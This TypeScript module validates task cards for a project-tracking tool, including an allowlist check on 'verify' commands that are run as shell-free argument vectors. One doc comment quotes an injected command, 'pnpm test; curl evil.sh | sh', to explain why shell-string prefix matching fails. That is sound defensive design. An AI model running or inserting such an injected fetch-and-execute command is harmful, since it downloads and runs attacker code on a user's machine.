import {
    ARGV_CONTROL_CHARACTER_RE,
    CARD_EFFORTS,
    CARD_PRIORITIES,
    CARD_STATUSES,
    CARD_TYPES,
    VERIFICATION_POLICY_DEFAULT_AREA,
    VERIFY_TIMEOUT_SECONDS_DEFAULT
} from "../../config/defaults.js";
import { ValidationError } from "../../core/errors.js";
import {
    CRITERION_DIGEST,
    parseAcceptance,
    staleBindings,
    verifyEntries
} from "./acceptance.js";

/**
 * Card fields whose value is a structure rather than a scalar or a list of
 * them, and which are therefore written through `--json-input` rather than
 * through a flag of their own.
 *
 * `verify` is the whole of it. ADR-0016 puts the commands in frontmatter
 * precisely because it is the half a human should not be hand-writing, and a
 * flag that took a JSON string on the command line would be hand-writing it in
 * the least forgiving place available.
 */
export const CARD_STRUCTURED_FIELDS = Object.freeze(["verify"]);

export const CARD_PATCHABLE_FIELDS = Object.freeze([
    "title",
    "status",
    "type",
    "priority",
    "area",
    "parent",
    "depends",
    "milestone",
    "source",
    "tags",
    "effort",
    "scope",
    "claimed_by",
    "claimed_at",
    "start",
    "due",
    "related",
    "origin",
    "verify"
]);

const DATE_RE = /^\d{4}-\d{2}-\d{2}$/;
const TIMESTAMP_RE = /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}(?:\.\d+)?Z$/;

/**
 * `details` is typed because the default value was not.
 *
 * `details = null` inferred the parameter as `null | undefined`, so under
 * `strictNullChecks` every single caller that passed the field it was
 * complaining about — which is most of them, and the reason the details exist —
 * was an error. Six of this file's eight baseline errors were this one
 * signature, and the axis checks would have made it eight.
 */
function fail(code: string, message: string, details: unknown = null): never {
    throw new ValidationError(code, message, details);
}

/**
 * The axes this workspace declares, as `[name, vocabulary]` pairs.
 *
 * Read through here rather than off `config.cards.axes` directly: a workspace
 * loaded from a config written before axes existed has no such key, and every
 * caller would otherwise need the same `|| {}`.
 */
export function declaredAxes(workspace): Array<[string, string[]]> {
    return Object.entries(workspace?.config?.cards?.axes || {});
}

export function axisNames(workspace): string[] {
    return declaredAxes(workspace).map(([name]) => name);
}

/**
 * The methods this project accepts for `area`, or `null` when it declares no
 * policy that covers it.
 *
 * `null` rather than the full vocabulary, and that distinction is the whole of
 * the default. A project with no opinion has to give the gate *nothing to
 * check* — not a list that happens to contain everything — because those two
 * are the same verdict today and stop being the same the moment a fourth method
 * exists. It is also what lets `workfile schema` report an empty map honestly
 * instead of a policy nobody wrote.
 *
 * `Object.hasOwn` rather than a bare index, so an area called `toString` or
 * `constructor` falls through to `*` instead of picking up a prototype member.
 */
export function acceptedVerificationMethods(workspace, area: string): string[] | null {
    const declared = workspace?.config?.cards?.verification?.methods;
    if (!declared || typeof declared !== "object") return null;
    const own = (key: string) =>
        Object.hasOwn(declared, key) ? declared[key] : undefined;
    const accepted = own(area) ?? own(VERIFICATION_POLICY_DEFAULT_AREA);
    return Array.isArray(accepted) && accepted.length ? [...accepted] : null;
}

/**
 * The accepted list when `method` is refused for `area`, and `null` when it
 * passes.
 *
 * One function rather than a boolean predicate because both callers need the
 * verdict *and* the list to name in the message, and a predicate would send
 * each of them back for a second, separately-nullable lookup.
 *
 * `forced` is never judged. It is not a method a caller chose, it is the record
 * saying that a gate was walked past and a reason was written down — so putting
 * it in front of a policy would be asking whether the project accepts being
 * forced, which is a question `--force` has already answered on the trail. An
 * absent method is not judged either, and cannot arise from a close: T-0186
 * resolves every write into `done` to `local` when the caller names nothing.
 * What reaches here without a method is a card closed before the block existed,
 * and that card asserts nothing to check.
 */
export function verificationRefusal(
    workspace,
    area: string,
    method: unknown
): string[] | null {
    if (!method || method === "forced") return null;
    const accepted = acceptedVerificationMethods(workspace, area);
    if (!accepted || accepted.includes(String(method))) return null;
    return accepted;
}

/**
 * Lift an `axes: { name: value }` container into the flat keys a card stores.
 *
 * ADR-0008 makes an axis a flat frontmatter key, and that is what the file
 * holds and what `search "context:treasury"` reads. The container exists
 * because neither machine surface can express a per-project key on its own:
 * `COMMAND_FLAGS` is static, so the CLI needs `--axis name=value`, and the MCP
 * tool schema is static and closed, so it needs a named object property. Both
 * funnel through here, which is also the only place that can tell a caller it
 * named an axis nothing declares — written flat it would become a legal but
 * unvalidated key, which is the tags failure mode this design exists to avoid.
 */
export function expandAxes(workspace, input) {
    if (!input || typeof input !== "object" || Array.isArray(input)) return input;
    if (!("axes" in input)) return input;
    const { axes, ...rest } = input as Record<string, any>;
    if (axes == null) return rest;
    if (typeof axes !== "object" || Array.isArray(axes)) {
        fail(
            "CARD_AXES_INVALID",
            "axes must be an object mapping an axis name to a value."
        );
    }
    const declared = axisNames(workspace);
    const unknown = Object.keys(axes).filter((name) => !declared.includes(name));
    if (unknown.length) {
        fail(
            "CARD_AXIS_UNKNOWN",
            `Undeclared card axes: ${unknown.join(", ")}.` +
                (declared.length
                    ? ` Declared: ${declared.join(", ")}.`
                    : " This project declares none; add cards.axes to its config."),
            { axes: unknown, declared }
        );
    }
    return { ...rest, ...axes };
}

export function sanitizeCardChanges(changes, axes: string[] = []) {
    if (!changes || typeof changes !== "object" || Array.isArray(changes)) {
        fail("CARD_CHANGES_INVALID", "Card changes must be an object.");
    }
    const allowed: Record<string, any> = {};
    const unknown: string[] = [];
    for (const [key, value] of Object.entries(changes)) {
        if (CARD_PATCHABLE_FIELDS.includes(key) || axes.includes(key)) {
            allowed[key] = value;
        } else unknown.push(key);
    }
    if (unknown.length) {
        fail(
            "CARD_FIELD_NOT_PATCHABLE",
            `Unsupported card fields: ${unknown.join(", ")}` +
                (axes.length ? `. Declared axes: ${axes.join(", ")}.` : ""),
            { fields: unknown }
        );
    }
    if (!Object.keys(allowed).length) {
        fail("CARD_CHANGES_EMPTY", "No card fields were provided.");
    }
    return allowed;
}

export function applyCardChanges(card, changes) {
    const result = { ...card };
    for (const [key, value] of Object.entries(changes)) {
        if (
            value == null ||
            value === "" ||
            (Array.isArray(value) && value.length === 0)
        ) {
            delete result[key];
        } else {
            result[key] = value;
        }
    }
    return result;
}

const VERIFY_KEYS = ["id", "run", "criteria"];
const VERIFY_ID = /^[a-z0-9][a-z0-9-]*$/;

/**
 * A card's `run` is an argument vector, and it is spawned without a shell.
 *
 * This is the decision the allowlist rests on, so it is worth stating where the
 * check lives. Over a shell string no prefix matcher can be sound: `pnpm test`
 * is a prefix of `pnpm test; curl evil.sh | sh`, and of every backtick, `&&`
 * and newline variant of the same trick. The matcher would be deciding what a
 * shell it never runs is going to do with the rest of the line, which is a
 * question with no honest answer.
 *
 * As `["pnpm", "test"]` handed to `spawn(file, args, { shell: false })` the
 * question disappears rather than being answered: the array the matcher
 * compares is the argument vector the operating system receives, with no parse
 * in between, and metacharacters are bytes inside one argument. Prefix matching
 * is then element-wise string equality, which is decidable.
 *
 * The cost is that `run` cannot be written the way ADR-0016 draws it. That is
 * the right trade and the decision record needs the amendment; a shape that
 * reads like shell but is not one would be worse than either.
 */
export function argvElements(run: unknown): string[] | null {
    if (!Array.isArray(run) || run.length === 0) return null;
    return run.every(
        (part) =>
            typeof part === "string" &&
            part !== "" &&
            !ARGV_CONTROL_CHARACTER_RE.test(part)
    )
        ? (run as string[])
        : null;
}

/** An argv rendered for a human to read in an error or a doctor line. */
export function formatCommand(argv: readonly string[]): string {
    return argv.join(" ");
}

/**
 * The argv prefixes this project permits, or an empty list when it declares
 * none.
 *
 * Read through here rather than off the config so the empty default is one
 * expression rather than a `|| []` at every call site — and so "declares
 * nothing" and "declares an empty list" cannot diverge, since they mean the
 * same thing and both have to refuse everything.
 */
export function allowedCommands(workspace): string[][] {
    const declared = workspace?.config?.cards?.verification?.commands;
    return Array.isArray(declared) ? (declared as string[][]) : [];
}

/**
 * How long a declared command may run here, in seconds.
 *
 * Same reason `allowedCommands` is a function: the fallback is a rule, and a
 * rule written at two call sites is a rule that will eventually differ between
 * them. A declared value has already passed config validation, so anything that
 * is not a usable number here came from a workspace object somebody built by
 * hand — `card verify` still has to have a number, so it takes the default
 * rather than dividing by `NaN`.
 */
export function verifyTimeoutSeconds(workspace): number {
    const declared = workspace?.config?.cards?.verification?.timeoutSeconds;
    return typeof declared === "number" && Number.isFinite(declared) && declared > 0
        ? declared
        : VERIFY_TIMEOUT_SECONDS_DEFAULT;
}

/**
 * Whether `argv` starts with one of the declared prefixes.
 *
 * Element-wise `===` and nothing else. It must not lower-case, trim, resolve a
 * path, strip quotes, `normalize()` the Unicode or join the vector into a
 * string and search it — every one of those opens a gap between the command
 * that was matched and the command that will run, which is the only thing this
 * function exists to close. A homoglyph or a stray space therefore does not
 * match, and does not need a character rule to be refused: it is simply not the
 * command the project declared.
 */
export function commandAllowed(allowed: string[][], argv: readonly string[]): boolean {
    return allowed.some(
        (prefix) =>
            prefix.length > 0 &&
            prefix.length <= argv.length &&
            prefix.every((part, index) => part === argv[index])
    );
}

/**
 * The refusal, phrased for both halves of "empty by default".
 *
 * One code with a branching message, following `CARD_AXIS_UNKNOWN` above: a
 * caller switching on the code wants one branch, and a human reading it wants
 * two different remedies — declare the command, or declare the first one this
 * project has.
 */
export function commandNotAllowedMessage(
    id: string,
    argv: readonly string[],
    allowed: string[][]
): string {
    return (
        `Verify entry ${id} runs \`${formatCommand(argv)}\`, which this project does not permit. ` +
        (allowed.length
            ? `Declared: ${allowed.map((prefix) => `\`${formatCommand(prefix)}\``).join(", ")}.`
            : "This project declares none; add cards.verification.commands to its config.")
    );
}

/**
 * The `verify` block, checked before it can land.
 *
 * Refused at write time rather than reported later because every one of these
 * is a card the runner could not act on: an entry with no `run` proves nothing,
 * two entries sharing an id make `card verify --only` ambiguous, and a digest
 * matching no criterion is a binding to text that is not on the card. A card
 * carrying any of them would read as machine-verifiable and be nothing of the
 * kind.
 *
 * The exception is a criterion edited *after* the binding was written. That
 * goes through the body, which this never sees, and it is `doctor`'s to report
 * — the digest exists to make exactly that visible rather than to prevent it.
 *
 * The allowlist is checked here for the same reason as the rest: a command the
 * project does not permit is a card the runner will not act on, so it should
 * never land. It checks the whole candidate rather than only what the write
 * changed, which means a card that already carries a disallowed command is
 * refused every mutation until the block is cleared — `card patch ID
 * --json-input -` with `{"verify": null}` is the way out, and the same is
 * already true of a duplicate entry id. What that gate cannot see is a card
 * that arrived as a file in somebody's diff and never called a mutation at all,
 * which is why `diagnoseCards` runs the identical check on read.
 */
function validateVerify(workspace, candidate) {
    const verify = candidate.verify;
    if (verify == null || verify === "") return;
    const allowed = allowedCommands(workspace);
    if (!Array.isArray(verify)) {
        fail("CARD_VERIFY_INVALID", "verify must be a list of entries.");
    }
    if (verifyEntries(verify).length !== verify.length) {
        fail(
            "CARD_VERIFY_INVALID",
            "Each verify entry must be a mapping of id, run and criteria."
        );
    }
    const seen = new Set<string>();
    for (const entry of verifyEntries(verify)) {
        const unknown = Object.keys(entry).filter(
            (key) => !VERIFY_KEYS.includes(key)
        );
        if (unknown.length) {
            fail(
                "CARD_VERIFY_KEY_UNKNOWN",
                `Unsupported verify keys: ${unknown.join(", ")}. Allowed: ${VERIFY_KEYS.join(", ")}.`,
                { keys: unknown }
            );
        }
        if (!VERIFY_ID.test(String(entry.id || ""))) {
            fail(
                "CARD_VERIFY_ID_INVALID",
                `A verify entry needs an id of lowercase letters, digits and hyphens; got: ${entry.id ?? "(none)"}`,
                { id: entry.id ?? null }
            );
        }
        if (seen.has(entry.id)) {
            fail(
                "CARD_VERIFY_ID_DUPLICATE",
                `Two verify entries share the id ${entry.id}.`,
                { id: entry.id }
            );
        }
        seen.add(entry.id);
        if (entry.run == null || (Array.isArray(entry.run) && !entry.run.length)) {
            fail(
                "CARD_VERIFY_RUN_REQUIRED",
                `Verify entry ${entry.id} declares no command to run.`,
                { id: entry.id }
            );
        }
        const argv = argvElements(entry.run);
        if (!argv) {
            fail(
                "CARD_VERIFY_RUN_INVALID",
                `Verify entry ${entry.id} must write run as an argument vector — ` +
                    `run: [pnpm, test] — of non-empty strings holding no control ` +
                    `characters. It is spawned without a shell, so a single string ` +
                    `would have to be parsed by something, and nothing here parses it.`,
                { id: entry.id, run: entry.run ?? null }
            );
        }
        if (!commandAllowed(allowed, argv)) {
            fail(
                "CARD_VERIFY_COMMAND_NOT_ALLOWED",
                commandNotAllowedMessage(entry.id, argv, allowed),
                { id: entry.id, run: argv, declared: allowed }
            );
        }
        const criteria = entry.criteria == null ? [] : entry.criteria;
        if (!Array.isArray(criteria)) {
            fail(
                "CARD_VERIFY_CRITERIA_INVALID",
                `Verify entry ${entry.id} must list its criteria as digests.`,
                { id: entry.id }
            );
        }
        for (const digest of criteria) {
            if (!CRITERION_DIGEST.test(String(digest))) {
                fail(
                    "CARD_VERIFY_DIGEST_INVALID",
                    `Verify entry ${entry.id} carries ${digest}, which is not a sha256 criterion digest.`,
                    { id: entry.id, digest }
                );
            }
        }
    }
    const stale = staleBindings(parseAcceptance(candidate.body || ""), verify);
    if (stale.length) {
        fail(
            "CARD_VERIFY_CRITERION_UNKNOWN",
            `No acceptance criterion on this card hashes to ${stale
                .map((entry) => entry.digest)
                .join(", ")}. A binding names the text it proves, so the text has to be there.`,
            { bindings: stale }
        );
    }
}

function hierarchyDepth(candidate, byId) {
    let current = candidate;
    let depth = 0;
    const seen = new Set([candidate.id].filter(Boolean));
    while (current?.parent) {
        if (seen.has(current.parent)) {
            fail("CARD_PARENT_CYCLE", "The parent hierarchy contains a cycle.");
        }
        seen.add(current.parent);
        depth += 1;
        current = byId.get(current.parent);
        if (!current) break;
    }
    return depth;
}

export function validateCardCandidate(workspace, candidate, cards, currentId = null) {
    for (const key of ["title", "status", "type", "priority", "area"]) {
        if (candidate[key] == null || candidate[key] === "") {
            fail("CARD_REQUIRED_FIELD", `${key} cannot be empty.`, { field: key });
        }
    }
    if (String(candidate.title).trim().length > 80) {
        fail("CARD_TITLE_TOO_LONG", "title must be at most 80 characters.");
    }
    const enums = {
        status: CARD_STATUSES,
        type: CARD_TYPES,
        priority: CARD_PRIORITIES,
        area: workspace.config.cards.areas,
        effort: CARD_EFFORTS
    };
    for (const [key, allowed] of Object.entries(enums)) {
        const value = candidate[key];
        if (value != null && value !== "" && !allowed.includes(value)) {
            fail("CARD_ENUM_INVALID", `Invalid ${key}: ${value}`, {
                field: key,
                value,
                allowed
            });
        }
    }
    // Declared axes validate exactly the way `area` does, one rung later. The
    // distinct code is what lets doctor and the UI say "outside the declared
    // vocabulary" rather than "invalid enum": an axis is a project's own
    // classification, not one of the schema's, and the remedy differs — declare
    // the value or fix the card.
    for (const [axis, allowed] of declaredAxes(workspace)) {
        const value = candidate[axis];
        if (value == null || value === "") continue;
        if (!allowed.includes(value)) {
            fail(
                "CARD_AXIS_VALUE_INVALID",
                `Invalid ${axis}: ${value}. Declared values: ${allowed.join(", ")}.`,
                { field: axis, value, allowed }
            );
        }
    }
    for (const key of ["start", "due"]) {
        const value = candidate[key];
        if (value && !DATE_RE.test(value)) {
            fail("CARD_DATE_INVALID", `${key} must use YYYY-MM-DD.`, {
                field: key,
                value
            });
        }
    }
    if (candidate.start && candidate.due && candidate.start > candidate.due) {
        fail(
            "CARD_DATE_RANGE_INVALID",
            `start ${candidate.start} is after due ${candidate.due}.`
        );
    }
    if (candidate.claimed_at && !TIMESTAMP_RE.test(candidate.claimed_at)) {
        fail(
            "CARD_CLAIM_TIMESTAMP_INVALID",
            "claimed_at must use RFC 3339 UTC."
        );
    }
    const byId = new Map(cards.map((card) => [card.id, card]));
    if (currentId) byId.set(currentId, candidate);
    if (candidate.parent) {
        if (candidate.parent === currentId || candidate.parent === candidate.id) {
            fail("CARD_SELF_PARENT", "A card cannot parent itself.");
        }
        if (!byId.has(candidate.parent)) {
            fail("CARD_PARENT_NOT_FOUND", `Parent not found: ${candidate.parent}`);
        }
        const depth = hierarchyDepth(candidate, byId);
        if (depth > workspace.config.cards.maxHierarchyDepth) {
            fail(
                "CARD_HIERARCHY_TOO_DEEP",
                `Parent hierarchy depth ${depth} exceeds ${workspace.config.cards.maxHierarchyDepth}.`
            );
        }
    }
    for (const dependency of candidate.depends || []) {
        if (dependency === currentId || dependency === candidate.id) {
            fail("CARD_SELF_DEPENDENCY", "A card cannot depend on itself.");
        }
        if (!byId.has(dependency)) {
            fail("CARD_DEPENDENCY_NOT_FOUND", `Dependency not found: ${dependency}`);
        }
    }
    // T-0161. The third relationship field, which had a `doctor` rule and no
    // write-time guard — so `card create --title X --origin T-0001` allocating
    // `T-0001` reported success and left the repository in a state `doctor`
    // calls an error. The pre-commit hook then refuses the next commit, for a
    // card written minutes earlier by a command that said it worked.
    //
    // Existence is deliberately not checked here, unlike `parent` and
    // `depends`. An origin may legitimately name a record that does not exist
    // yet — a card can come out of a decision still being written — which is
    // why `missing-origin` stays a `doctor` rule and this is not.
    for (const origin of candidate.origin || []) {
        if (origin === currentId || origin === candidate.id) {
            fail("CARD_SELF_ORIGIN", "A card cannot originate from itself.");
        }
    }
    const hasActor = Boolean(candidate.claimed_by);
    const hasTimestamp = Boolean(candidate.claimed_at);
    if (hasActor !== hasTimestamp) {
        fail(
            "CARD_CLAIM_PARTIAL",
            "claimed_by and claimed_at must be set or cleared together."
        );
    }
    if (candidate.status === "doing" && !hasActor) {
        fail("CARD_CLAIM_REQUIRED", "A doing card must have an active claim.");
    }
    if (hasActor && candidate.status !== "doing") {
        fail("CARD_CLAIM_STATUS_INVALID", "Claimed cards must have status doing.");
    }
    validateVerify(workspace, candidate);
    return candidate;
}

function normalizeScopePath(value) {
    return String(value || "")
        .replaceAll("\\", "/")
        .replace(/^\.\//, "")
        .replace(/\/+$/, "");
}

export function scopesOverlap(left = [], right = []) {
    const matches: string[][] = [];
    for (const leftRaw of left) {
        const a = normalizeScopePath(leftRaw);
        if (!a) continue;
        for (const rightRaw of right) {
            const b = normalizeScopePath(rightRaw);
            if (!b) continue;
            if (a === b || a.startsWith(`${b}/`) || b.startsWith(`${a}/`)) {
                matches.push([leftRaw, rightRaw]);
            }
        }
    }
    return matches;
}
